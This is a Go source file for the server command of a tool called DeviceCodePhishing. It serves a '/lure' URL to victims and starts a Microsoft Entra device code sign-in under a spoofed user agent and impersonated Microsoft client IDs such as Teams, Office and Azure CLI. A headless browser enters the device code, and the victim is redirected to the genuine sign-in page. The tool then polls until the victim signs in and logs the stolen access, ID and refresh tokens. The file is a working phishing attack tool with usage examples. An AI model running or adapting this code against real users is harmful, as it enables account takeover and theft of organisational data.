package cmd

import (
	"log"
	"log/slog"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/denniskniep/DeviceCodePhishing/pkg/entra"
	"github.com/denniskniep/DeviceCodePhishing/pkg/utils"
	"github.com/spf13/cobra"
)

const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
const MsAuthenticationBroker string = "29d9ed98-a469-4536-ade2-f981bc1d605e"
const DefaultTenant string = "common"

// Predefined user agents (updated to current versions)
var predefinedUserAgents = map[string]string{
	"firefox-android": "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",
	"chrome-android":  "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
	"edge-android":    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro Build/UQ1A.240105.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36 EdgA/131.0.0.0",
	"android-browser": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36",
	"firefox-macos":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:132.0) Gecko/20100101 Firefox/132.0",
	"chrome-macos":    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"edge-macos":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
	"safari-macos":    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
	"chrome-desktop":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"ie11":            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"firefox-windows": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
	"edge-legacy":     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36 Edg/100.0.1185.50",
	"edge-ios":        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 EdgiOS/131.0.0.0 Mobile/15E148 Safari/605.1.15",
	"chrome-ios":      "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/131.0.0.0 Mobile/15E148 Safari/604.1",
	"safari-ios":      "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
	"firefox-ios":     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/132.0 Mobile/15E148 Safari/605.1.15",
}

// Predefined ClientIds
var predefinedClientIds = map[string]string{
	"office365":       "00b41c95-dab0-4487-9791-b9d2c32c80f2", // Office 365 Management
	"azurecli":        "04b07795-8ddb-461a-bbee-02f9e1bf7b46", // Microsoft Azure CLI
	"azurepowershell": "1950a258-227b-4e31-a9cf-717495945fc2", // Microsoft Azure PowerShell
	"msteams":         "1fec8e78-bce4-4aaf-ab1b-5451cc387264", // Microsoft Teams
	"winsearch":       "26a7ee05-5602-4d76-a7ba-eae8b7b67941", // Windows Search
	"outlook":         "27922004-5251-4030-b22d-91ecd9a37ea4", // Outlook Mobile
	"authenticator":   "4813382a-8fa7-425e-ab75-3b753aab3abb", // Microsoft Authenticator App
	"onedrive":        "ab9b8c07-8f02-4f72-87fa-80105867a763", // OneDrive SyncEngine
	"office":          "d3590ed6-52b3-4102-aeff-aad2292ab01c", // Microsoft Office
	"visualstudio":    "872cd9fa-d31f-45e0-9eab-6e460a02d1f1", // Visual Studio
	"onedriveios":     "af124e86-4e96-495a-b70a-90f90ab96707", // OneDrive iOS App
	"bingsearch":      "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8", // Microsoft Bing Search for Microsoft Edge
	"stream":          "844cca35-0656-46ce-b636-13f48b0eecbd", // Microsoft Stream Mobile Native
	"teamsadmin":      "87749df4-7ccf-48f8-aa87-704bad0e0e16", // Microsoft Teams - Device Admin Agent
	"bing":            "cf36b471-5b44-428c-9ce7-313bf84528de", // Microsoft Bing Search
	"msauthbroker":    "29d9ed98-a469-4536-ade2-f981bc1d605e", // Microsoft Authentication Broker
}

var (
	address         string
	customUserAgent string
	userAgent       string
	clientId        string
	customClientId  string
	tenant          string
	pathPrefix      string
)

func init() {
	rootCmd.AddCommand(runCmd)
	runCmd.Flags().StringVarP(&address, "address", "a", ":8080", "Server listening address")
	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", "", "Predefined User-Agent to use (see --help for list)")
	runCmd.Flags().StringVar(&customUserAgent, "custom-user-agent", EdgeOnWindows, "Custom User-Agent string")
	runCmd.Flags().StringVarP(&clientId, "client-id", "c", "", "ClientId key to use (see --help for predefined options)")
	runCmd.Flags().StringVar(&customClientId, "custom-client-id", "", "Custom ClientId (full GUID)")
	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Azure tenant to target")
	runCmd.Flags().StringVarP(&pathPrefix, "path", "p", "", "Custom path prefix for the lure URL (e.g., /custom)")
}

var runCmd = &cobra.Command{
	Use:   "server",
	Short: "Starts the phishing server",
	Long: `Starts the phishing server. Listens by default on http://localhost:8080/lure

Available User-Agent options for --user-agent:
  firefox-android        - Firefox on Android
  chrome-android         - Chrome on Android
  edge-android          - Edge on Android
  android-browser       - Default Android browser
  firefox-macos         - Firefox on macOS
  chrome-macos          - Chrome on macOS
  edge-macos            - Edge on macOS
  safari-macos          - Safari on macOS
  chrome-desktop        - Chrome on Windows
  ie11                  - Internet Explorer 11
  firefox-windows       - Firefox on Windows
  edge-legacy           - Legacy Edge on Windows
  edge-ios              - Edge on iOS
  chrome-ios            - Chrome on iOS
  safari-ios            - Safari on iOS
  firefox-ios           - Firefox on iOS

Available ClientId options for --client-id:
  msauthbroker          - Microsoft Authentication Broker (default)
  office365             - Office 365 Management
  azurecli              - Microsoft Azure CLI
  azurepowershell       - Microsoft Azure PowerShell
  msteams               - Microsoft Teams
  winsearch             - Windows Search
  outlook               - Outlook Mobile
  authenticator         - Microsoft Authenticator App
  onedrive              - OneDrive SyncEngine
  office                - Microsoft Office
  visualstudio          - Visual Studio
  onedriveios           - OneDrive iOS App
  bingsearch            - Microsoft Bing Search for Edge
  stream                - Microsoft Stream Mobile Native
  teamsadmin            - Microsoft Teams - Device Admin Agent
  bing                  - Microsoft Bing Search

Examples:
  # Using predefined options
  DeviceCodePhishing server --user-agent chrome-android --client-id msteams
  
  # Using custom ClientId  
  DeviceCodePhishing server --custom-client-id "your-custom-clientid-guid"
  
  # With custom path
  DeviceCodePhishing server --path /auth --client-id azurecli
  
  # With custom user agent
  DeviceCodePhishing server --custom-user-agent "Mozilla/5.0..." --client-id office365
  
Note: Cannot specify both --client-id and --custom-client-id simultaneously`,
	Run: func(cmd *cobra.Command, args []string) {
		// Determine which user agent to use
		finalUserAgent := customUserAgent
		if userAgent != "" {
			if ua, ok := predefinedUserAgents[userAgent]; ok {
				finalUserAgent = ua
			} else {
				slog.Error("Invalid user-agent", "provided", userAgent, "available", strings.Join(getAvailableUserAgents(), ", "))
				os.Exit(1)
			}
		}

		// Determine which ClientId to use
		finalClientId := ""

		// Check if both client-id and custom-client-id are provided
		if clientId != "" && customClientId != "" {
			slog.Error("Cannot specify both --client-id and --custom-client-id",
				"clientId", clientId,
				"customClientId", customClientId)
			os.Exit(1)
		}

		// Use predefined ClientId
		if clientId != "" {
			if cid, ok := predefinedClientIds[clientId]; ok {
				finalClientId = cid
			} else {
				slog.Error("Invalid client-id", "provided", clientId, "available", strings.Join(getAvailableClientIds(), ", "))
				os.Exit(1)
			}
		}

		// Use custom ClientId
		if customClientId != "" {
			finalClientId = customClientId
		}

		// If no ClientId specified, use default
		if finalClientId == "" {
			finalClientId = MsAuthenticationBroker
		}

		// Sanitize path prefix
		if pathPrefix != "" {
			if !strings.HasPrefix(pathPrefix, "/") {
				pathPrefix = "/" + pathPrefix
			}
			pathPrefix = strings.TrimSuffix(pathPrefix, "/")
		}

		// Set up a single resource handler
		lurePath := pathPrefix + "/lure"
		http.HandleFunc(lurePath, getLureHandler(finalClientId, finalUserAgent))

		host, port, err := net.SplitHostPort(address)
		if err != nil || port == "" {
			slog.Error("Invalid address format", "address", address, "error", err)
			os.Exit(1)
		}

		// Create a Server instance to listen on port
		server := &http.Server{
			Addr: address,
		}

		slog.Info("Start Server",
			"tenant", tenant,
			"clientId", finalClientId,
			"userAgent", finalUserAgent)

		if host == "" {
			host = "localhost"
		}

		slog.Info("Lure available at", "url", "http://"+host+":"+port+lurePath)

		// Listen to HTTP connections and wait
		log.Fatal(server.ListenAndServe())
	},
}

func getLureHandler(clientId string, userAgent string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		slog.Info("Lure opened", "clientId", clientId, "remoteAddr", r.RemoteAddr)

		http.DefaultClient.Transport = utils.SetUserAgent(http.DefaultClient.Transport, userAgent)

		scopes := []string{"openid", "profile", "offline_access"}
		deviceAuth, err := entra.RequestDeviceAuth(tenant, clientId, scopes)
		if err != nil {
			slog.Error("Error starting device code flow", "error", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		redirectUri, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth, userAgent)
		if err != nil {
			slog.Error("Error during headless browser automation", "error", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		go startPollForToken(tenant, clientId, deviceAuth)
		http.Redirect(w, r, redirectUri, http.StatusFound)
	}
}

func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceAuth) {
	pollInterval := time.Duration(deviceAuth.Interval) * time.Second

	for {
		time.Sleep(pollInterval)
		slog.Info("Checking for token", "userCode", deviceAuth.UserCode, "clientId", clientId)
		result, err := entra.RequestToken(tenant, clientId, deviceAuth)

		if err != nil {
			slog.Error("Error requesting token", "error", err)
			return
		}

		if result != nil {
			slog.Info("Token received", "userCode", deviceAuth.UserCode, "clientId", clientId)
			slog.Info("ACCESS TOKEN:", "token", result.AccessToken)
			slog.Info("ID TOKEN:", "token", result.IdToken)
			slog.Info("REFRESH TOKEN:", "token", result.RefreshToken)
			return
		}
	}
}

func getAvailableUserAgents() []string {
	agents := make([]string, 0, len(predefinedUserAgents))
	for key := range predefinedUserAgents {
		agents = append(agents, key)
	}
	return agents
}

func getAvailableClientIds() []string {
	clients := make([]string, 0, len(predefinedClientIds))
	for key := range predefinedClientIds {
		clients = append(clients, key)
	}
	return clients
}
